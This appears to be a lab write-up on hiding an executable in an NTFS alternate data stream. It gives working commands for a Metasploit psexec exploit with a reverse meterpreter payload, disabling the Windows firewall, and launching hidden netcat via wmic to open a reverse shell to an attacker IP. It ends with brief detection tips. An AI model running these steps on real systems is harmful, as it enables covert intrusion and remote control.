# Windows Lab — NTFS Alternate Data Streams (ADS)

## Objective
Hide malicious executable inside legitimate file using NTFS ADS.
Demonstrate evasion technique used by real malware.

## Environment
- Attacker: Kali Linux 
- Target: Windows Server 2022 
- Credentials: administrator / (windows server password)

## Steps

### 1. Exploit Windows Server with PSExec
```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 192.168.x.x #target ip
set SMBUser administrator
set SMBPass xxxxx  #(windows server password)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.x.x # attacker ip
run
```

### 2. Upload Netcat Binary
```bash
meterpreter > upload /usr/share/windows-binaries/nc.exe C:\
meterpreter > shell
```

### 3. Create Innocent Text File
```cmd
echo "This is a normal text file." > C:\readme.txt
```

### 4. Hide nc.exe in Alternate Data Stream
```cmd
type C:\nc.exe > C:\readme.txt:hidden.exe
```

### 5. Verify Hidden Stream (Only visible with /r flag)
```cmd
dir /r C:\readme.txt
```
Result: `readme.txt:hidden.exe:$DATA   59,392 bytes` ✅

### 6. Disable Windows Firewall
```cmd
netsh advfirewall set allprofiles state off
```

### 7. Setup Netcat Listener (New Terminal on Kali)
```bash
nc -lvnp 5555
```

### 8. Execute Hidden Payload (Using wmic - Living off the Land)
```cmd
wmic process call create "C:\readme.txt:hidden.exe -e cmd 192.168.18.128 5555"
```

### 9. Reverse Shell Obtained
Result: Shell connected on netcat listener on port 5555 ✅

## Why This Technique Works
- **Invisible by default** — `dir` won't show `:hidden.exe`
- **Uses legitimate tools** — wmic is trusted Windows tool
- **Bypasses detection** — file appears as innocent readme.txt
- **Real APT technique** — used by Lazarus, APT28 groups

## Detection Methods
```bash
dir /r                          # reveals alternate streams
Get-Item -Stream * (PowerShell)
Forensic analysis tools
```

## Tools Used
- Metasploit Framework
- Netcat (nc.exe)
- Windows wmic
- NTFS Alternate Data Streams

## Status
✅ Successfully hid and executed malware - Full code execution achieved
